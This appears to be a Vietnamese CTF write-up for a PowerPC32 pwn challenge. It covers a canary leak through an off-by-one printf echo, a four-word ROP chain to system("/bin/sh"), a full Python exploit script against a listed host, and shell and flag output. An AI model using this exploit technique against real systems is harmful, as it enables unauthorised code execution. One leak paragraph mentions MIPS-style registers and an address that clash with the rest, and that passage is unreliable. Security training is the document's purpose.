---
title: "PWN#Delta"
category: "Pwn"
tags: ["powerpc", "big-endian", "stack-canary", "canary-leak", "rop", "ret2system", "static-binary"]
solve_date: "2026-10-14T17:00:00+07:00"
language: "vi"
points: 54
---

# PWN#Delta — leak PowerPC32 canary rồi dùng ROP chain bốn word

**Flag:** CTF{c9a9816576849a4aae690a65c1fba37d}  
**Service:** nc 169.58.126.107 5011  
**Định dạng flag:** CTF{}

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| vault (ELF32 BE PowerPC, static, chưa strip) | 718,920 | — |

Trong lúc solve không ghi SHA-256 handout; digest duy nhất được lưu là linker BuildID sha1:ded868c5bd72ab766419da8c57e3e9c9e30bc0e2. Bản service chạy trong /challenge có cùng kích thước 718,920 byte.

## Đề bài

> PWN#Delta — 54 điểm. Lấy shell trên host từ xa và đọc flag.

Handout là vault, ELF PowerPC 32-bit **big-endian** link tĩnh với glibc, build bằng GCC Debian 15.3.0-4. Service in === Vault Terminal ===, hỏi tên, echo bằng printf("Hello, %s\n", buf), hỏi message, in Message received. rồi lặp lại lời chào vô hạn.

Binary chưa strip nên main, setup và vuln có tên trong .symtab. Remote chạy bằng nobody trong /challenge; flag ở /flag/flag.txt.

## Phân tích

### Build và protections

```text
ELF Header:
  Class:                             ELF32
  Data:                              2's complement, big endian
  Type:                              EXEC (Executable file)
  Machine:                           PowerPC
  Entry point address:               0x10000488
```

* **Không PIE:** ET_EXEC với LOAD đầu tại 0x10000000, nên địa chỉ dưới đây là absolute.
* **NX:** GNU_STACK là RW; stack không executable nên cần ROP chain.
* **Static:** readelf -r báo không có relocation — glibc được link vào binary.
* **Stack canary:** prologue load __stack_chk_guard từ -0x7008(r2); check lỗi gọi __stack_chk_fail_local tại 0x1001ef40.
* **Symbol table đầy đủ:** 1796 symbol, gồm system tại 0x100020d0, read tại 0x1001cb10, puts tại 0x100084a0 và printf tại 0x10002130.

| Symbol | Address | Ghi chú |
|---|---|---|
| main | 0x10000a80 | in banner, gọi vuln trong loop |
| setup | 0x100005d4 | ba lần gọi setvbuf |
| vuln | 0x100008f0 | state machine có overflow |
| debug_dump | 0x10000694 | dead code: strncpy + printf(buf) |
| stash_record | 0x10000730 | dead code: memcpy + puts |
| gadget_load_r9 | 0x100007cc | dead code, dùng làm gadget |
| gadget_vec_r3 | 0x10000834 | dead code, dùng làm gadget |

Toolchain host không disassemble được file — objdump của Strawberry Perl báo không nhận diện architecture — nên toàn bộ listing được tạo bằng Capstone 5.0.7 (CS_ARCH_PPC, CS_MODE_BIG_ENDIAN | CS_MODE_32) trên executable segment, tổng cộng 159,656 instruction.

### main

```text
0x10000a80  stwu     r1, -0x30(r1)
0x10000a84  mflr     r0
0x10000a88  stw      r0, 0x34(r1)
0x10000a94  mr       r31, r1
0x10000ab4  bl       0x100005d4        ; setup
0x10000ab8  lwz      r3, -0x7fe4(r30)
0x10000abc  bl       0x100084a0        ; puts("=== Vault Terminal ===")
0x10000ac0  bl       0x100008f0        ; vuln
0x10000ac4  b        0x10000ac0
```

vuln được gọi trong vòng lặp vô hạn, nên exploit chỉ cần thoát được một frame.

### Hàm dễ tổn thương

vuln là state machine điều khiển bởi counter tại 0x18(r31). Frame 0x70 byte; input buffer ở r31+0x1c:

```text
0x100008f0  stwu     r1, -0x70(r1)
0x100008f4  mflr     r0
0x100008f8  stw      r0, 0x74(r1)      ; saved LR  -> buf+88
0x100008fc  stw      r30, 0x68(r1)     ; saved r30 -> buf+76
0x10000900  stw      r31, 0x6c(r1)     ; saved r31 -> buf+80
0x10000904  mr       r31, r1
0x10000918  lwz      r9, -0x7008(r2)   ; __stack_chk_guard
0x1000091c  stw      r9, 0x5c(r31)     ; canary    -> buf+64
```

State 0 in Enter your name: rồi chuyển sang state 5 để đọc **65 byte** vào buffer:

```text
0x100009c0  addi     r9, r31, 0x1c     ; buf
0x100009c4  li       r5, 0x41           ; 65
0x100009cc  li       r3, 0
0x100009d0  bl       0x1001cb10        ; read(0, buf, 0x41)
```

State 6 chào lại bằng printf("Hello, %s\n", buf); state 7 hỏi rồi đọc tiếp **108 byte** vào cùng buffer (read(0, buf, 0x6c)); state 8 in Message received.; state 9 return. Lần read thứ hai dài hơn 20 byte so với khoảng cách tới saved link register nên return address do attacker kiểm soát được, miễn là biết canary.

| Offset tính từ buf | Nội dung |
|---:|---|
| 0 | đầu input buffer |
| 64 | stack canary |
| 76 | saved r30 |
| 80 | saved r31 |
| 88 | saved LR (return address) |

### Leak canary

Name read 65 byte, dài hơn buffer đúng một byte; byte thấp nhất của canary trong glibc này là 0x00. Gửi 64 byte filler cộng 1 marker sẽ ghi đè terminator đó, khiến printf("Hello, %s\n", ...) tiếp tục in 3 byte canary còn lại tới saved $fp rồi 3 byte saved $ra, dừng ở byte 0x00 trong 0x00400c28. Quan sát trên wire:

```text
2: b'Enter your name: Hello, NNNN…NNNNAgK\xee@\x80\rD\nLeave a message for the vault keeper: '
```

(64 ký tự N được rút gọn.) Bốn byte sau marker là canary; byte đầu của nó được khôi phục thành 0x00. Script gửi b"N" * 64 + b"A" rồi dựng canary = b"\x00" + leaked[:3]. Canary qua các kết nối: 0008846f, 00406a67, 00077d48, 009a31c7, 0042f4b4, 00c920ca.

### Tới được return address

Epilogue khôi phục r1 từ r31+0x70 trước blr; đây cũng là code compiler sinh cho debug_dump có frame 0x70 byte giống hệt:

```text
0x10000714  addi     r11, r31, 0x70
0x10000718  lwz      r0, 4(r11)        ; saved LR
0x1000071c  mtlr     r0
0x10000720  lwz      r30, -8(r11)
0x10000724  lwz      r31, -4(r11)
0x10000728  mr       r1, r11
0x1000072c  blr
```

Vì buf = r31+0x1c, blr để r1 = r31+0x70 = buf+84. PowerPC không có opcode ret: blr nhảy qua LR mà epilogue vừa nạp từ buf+88. Vì vậy control tới return slot đã bị overwrite, còn stack pointer nằm thấp hơn nó 4 byte.

### Gadgets

Gadget đầu quen thuộc của chain 32-bit, lwz r3, 0(r1), không có trong binary — scan byte pattern không tìm thấy, mr r3, r9 cũng vậy. Tác giả để lại bốn function không dùng trong .text (debug_dump, stash_record, gadget_load_r9, gadget_vec_r3); hai function tạo chain:

```text
0x100007ec  lwz      r9, 0(r1)         ; POP_R9_RET
0x100007f0  lwz      r0, 4(r1)
0x100007f4  mtlr     r0
0x100007f8  addi     r1, r1, 8
0x100007fc  blr
```

POP_R9_RET load r9 từ stack, load LR từ word kế tiếp rồi tăng r1 thêm 8.

VEC_BODY là phần thân gadget_vec_r3, vào tại 0x10000854 sau prologue. Nó splat r9 vào AltiVec register (vperm/vsel; control vector nằm trong word zero-filled ở .bss tại 0x100b0f80), lưu vector rồi nạp lane đầu tiên vào r3:

```text
0x1000089c  lis      r4, 0x100b
0x100008a0  addi     r4, r4, 0xf90
0x100008a4  stvx     v7, 0, r4
0x100008a8  lwz      r3, 0(r4)         ; r3 = the pointer we put in r9
0x100008ac  lwz      r0, 0(r1)
0x100008b0  mtlr     r0
0x100008b4  addi     r1, r1, 4
0x100008b8  blr
```

Tác động cuối là r3 = r9 rồi return bình thường qua stack word tiếp theo. Pointer cần truyền là 0x10074850, string /bin/sh trong .rodata — lưu ý 0x10074858 là string kế tiếp exit 0, rất dễ lệch 8 byte.

## Lời giải

### 1. Leak canary

Kết nối, đợi Enter your name:, gửi 65 byte rồi đọc tới Leave a message. Phần sau prefix 65 byte trong Hello blob là đuôi canary.

### 2. Đặt frame

Có 108 byte, dùng 104:

| Offset | Giá trị | Mục đích |
|---:|---|---|
| 0–63 | M × 64 | filler |
| 64 | canary đã leak | qua xor. check |
| 76 | 0x100b698c | khôi phục r30 (chain không dùng) |
| 80 | 0 | khôi phục r31 (chain không dùng) |
| 84 | 0 | padding; gadget lwz r9 đầu tiên tiêu thụ |
| 88 | 0x100007ec | saved LR → POP_R9_RET |
| 92 | 0x10074850 | "/bin/sh" |
| 96 | 0x10000854 | VEC_BODY |
| 100 | 0x100020d0 | system |

### 3. Chain

Lần đầu POP_R9_RET chạy với r1 = buf+84, nên nạp r9 = 0 từ padding và nạp lại LR từ buf+88, chính là gadget đó. Sau đó r1 thành buf+92 và gadget được gọi lần nữa. Lượt thứ hai thực hiện phần chính:

```text
[88]  POP_R9_RET   r9 = 0,        LR = [88] = POP_R9_RET, r1 = 92
[88]  POP_R9_RET   r9 = [92] = "/bin/sh", LR = [96] = VEC_BODY, r1 = 100
[96]  VEC_BODY     r3 = r9 = "/bin/sh",  LR = [100] = system,    r1 = 104
[100] system       system("/bin/sh")
```

Lượt đầu tự return giúp chain chỉ cần bốn word: return slot và argument slot chồng lên hai stack read của chính gadget.

### 4. Tương tác

read(0, buf, 0x6c) return, canary khớp, epilogue pop LR đã bị overwrite rồi chạy system("/bin/sh"). Service in Message received. trước shell output, nên phải nhận acknowledgement đó xong mới gửi command.

## Mã khai thác

Bản tự chứa của script cuối:

```python
"""PWN#Delta (vault) - PPC32 static, canary leak + 4-word ROP -> system("/bin/sh")."""
import struct, time, socket

HOST, PORT = "169.58.126.107", 5011
SH, SYSTEM = 0x10074850, 0x100020d0
POP_R9_RET, VEC_BODY = 0x100007EC, 0x10000854
GOT_R30 = 0x100B698C
CHAIN = [POP_R9_RET, SH, VEC_BODY, SYSTEM]


def u32(x):
    return struct.pack(">I", x & 0xFFFFFFFF)


def until(s, marker, t=6.0):
    s.settimeout(t)
    buf = b""
    end = time.time() + t
    while marker not in buf and time.time() < end:
        try:
            d = s.recv(4096)
        except OSError:
            break
        if not d:
            break
        buf += d
    return buf


def drain(s, t=2.0):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except OSError:
        pass
    return buf


def main(cmd=b"cat /flag/flag.txt"):
    s = socket.create_connection((HOST, PORT), 12)
    until(s, b"Enter your name: ")
    # stage 1: 64 filler + 1 marker over canary byte0 (always 0x00) -> leaks bytes 1..3
    s.sendall(b"N" * 64 + b"A")
    echo = until(s, b"Leave a message").split(b"Hello, ", 1)[1]
    canary = b"\x00" + (echo[65:].split(b"\nLeave")[0] + b"\x00\x00\x00")[:3]
    # stage 2: 108-byte read overflows LR at buf+88
    payload = (b"M" * 64 + canary + b"\x00" * 8 + u32(GOT_R30) + u32(0) + b"\x00" * 4
               + b"".join(u32(w) for w in CHAIN))
    assert len(payload) <= 0x6c
    s.sendall(payload)
    print("[*] canary      :", canary.hex())
    print("[*] ack         :", drain(s, 0.8))
    s.sendall(cmd + b"\n")
    time.sleep(0.6)
    out = drain(s, 3)
    print("[*] shell output:\n" + out.decode(errors="replace"))
    s.close()
    return out


if __name__ == "__main__":
    main()
```

## Kết quả

Lượt control thay SYSTEM bằng PUTS xác nhận gadget vector để lại string pointer trong r3 — puts in /bin/sh, sau đó process chết vì không gọi function:

```text
{'canary': '00406a67', 'ack': b'Message received.\n/bin/sh\n', 'out': b'', 'alive': False}
```

system("/bin/sh") cùng lệnh id (repr được xuống dòng cho vừa):

```text
{'canary': '00077d48', 'ack': b'Message received.\n',
 'out': b'uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\n', 'alive': True}
```

Liệt kê filesystem để tìm flag (các dòng liên quan trong output dài của pwd; ls -la /; find …; id; uname -a):

```text
/challenge
/flag
/flag/flag.txt
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
Linux fcf1f072366d 6.12.38+deb13-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.38-1 (2025-07-16) x86_64 GNU/Linux
```

cat /flag/flag.txt; ls -la /flag /challenge (bỏ các dòng total và . / ..):

```text
CTF{c9a9816576849a4aae690a65c1fba37d}
/challenge:
-r-xr-xr-x 1 root root 718920 Oct  9 19:46 vault

/flag:
-r--r--r-- 1 root root     38 Oct  9 20:00 flag.txt
```

Chạy lại script tổng hợp trên kết nối mới:

```text
[*] canary      : 00c920ca
[*] ack         : b'Message received.\n'
[*] shell output:
CTF{c9a9816576849a4aae690a65c1fba37d}
```

## Ghi chú

* Trong lúc chạy không ghi SHA-256 handout, chỉ lưu BuildID, nên trường digest để dấu gạch thay vì đoán.
* uname -a cho thấy kernel x86_64, nên binary PowerPC chạy qua qemu-ppc user-mode trong Docker; system() và /bin/sh hoạt động bình thường.
* /bin/sh ở 0x10074850. 0x10074858 là string exit 0 bên cạnh; trỏ r9 vào đó sẽ tạo shell thoát ngay.
* Binary không có lwz r3, 0(r1) hay mr r3, r9, nên thiếu gadget pop vào r3 thường gặp. Cặp POP_R9_RET → gadget_vec_r3 khả dụng nhờ hai dead function tác giả để lại.
* VEC_BODY phải vào tại 0x10000854, không phải đầu function 0x10000834: prologue sẽ tạo frame mới và phá r1 mà chain cần.
* Bốn byte 0 ở buf+84 là padding, không phải phần chain; gadget lwz r9 đầu tiên tiêu thụ chúng. Bỏ đi sẽ làm mỗi gadget lệch một word.
* Leak bị cắt nếu canary byte 1–3 có 0x00; script khi đó thêm NUL và dựng canary sai, nên chỉ cần reconnect để lấy canary mới.
* pwntools không dùng được trong môi trường này: remote.poll và select.POLLIN không tồn tại trên Windows. Script cuối dùng socket thuần, giúp thứ tự drain-before-send rõ ràng.
* Message received. được puts in sau lần read thứ hai, trước khi ROP chạy; phải chờ acknowledgement rồi mới gửi command, nếu không command bị lần read 108 byte nuốt mất.
